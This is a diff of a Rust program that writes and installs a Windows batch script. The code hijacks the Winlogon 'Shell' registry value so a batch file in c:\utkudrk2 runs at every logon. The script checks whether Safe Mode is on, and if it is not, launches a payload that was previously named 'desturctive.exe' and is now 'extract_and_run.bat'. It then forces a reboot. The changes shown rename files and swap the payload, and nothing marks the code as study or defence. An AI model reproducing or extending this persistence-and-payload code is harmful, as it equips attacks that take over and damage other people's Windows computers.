@@ -114,10 +114,10 @@ fn modify_registry() -> io::Result<()> {
     }
 
     // Set new "Shell" value
-    let new_shell_value = r"explorer.exe, c:\utkudrk2\utkudrk.bat";
+    let new_shell_value = r"explorer.exe, c:\utkudrk2\utkudrk2.bat";
     winlogon_key.set_value("Shell", &new_shell_value)?;
 
-    println!("Registry modified successfully: Shell set to \"explorer.exe, c:\\utkudrk2\\utkudrk.bat\".");
+    println!("Registry modified successfully: Shell set to \"explorer.exe, c:\\utkudrk2\\utkudrk2.bat\".");
 
     Ok(())
 }
@@ -132,7 +132,7 @@ if %errorlevel% == 0 (
     echo Safe Mode is enabled, proceeding with actions...
 ) else (
     echo Safe Mode is not enabled
-    start c:\utkudrk2\desturctive.exe
+    start c:\utkudrk2\extract_and_run.bat
     exit
 )
 
@@ -141,7 +141,7 @@ if %errorlevel% == 0 (
 :: Modify Shell registry to run batch file
 echo Modifying registry to set Shell value...
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, c:\utkudrk2\utkudrk.bat" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, c:\utkudrk2\utkudrk2.bat" /f
 
 :: Perform cleanup tasks
 echo Removing Safe Mode setting...
@@ -169,7 +169,7 @@ shutdown /r /f /t 5
 exit
 "#;
 
-    let path = Path::new("c:\\utkudrk2\\utkudrk.bat");
+    let path = Path::new("c:\\utkudrk2\\utkudrk2.bat");
     let mut file = File::create(path)?;
     file.write_all(batch_content.as_bytes())?;
 
